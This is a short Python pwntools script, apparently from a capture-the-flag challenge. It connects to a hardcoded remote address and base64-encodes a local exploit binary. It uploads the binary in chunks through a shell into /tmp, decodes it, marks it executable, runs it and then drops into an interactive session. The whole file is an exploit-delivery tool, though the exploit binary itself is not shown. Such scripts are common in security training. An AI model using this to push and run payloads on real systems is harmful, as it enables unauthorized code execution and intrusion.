from pwn import *
import time
import base64
import os

context.log_level = "debug"

def run(cmd):
    p.sendlineafter("$ ", cmd)
    p.recvline()

with open("./a.out", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

#p = remote("localhost", 1337) # remote
p = remote("193.148.168.30", 7670)

run('cd /tmp')

log.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > exploit\r')
run('rm b64exp\r')
run('chmod +x exploit\r')
run('./exploit')

p.interactive()
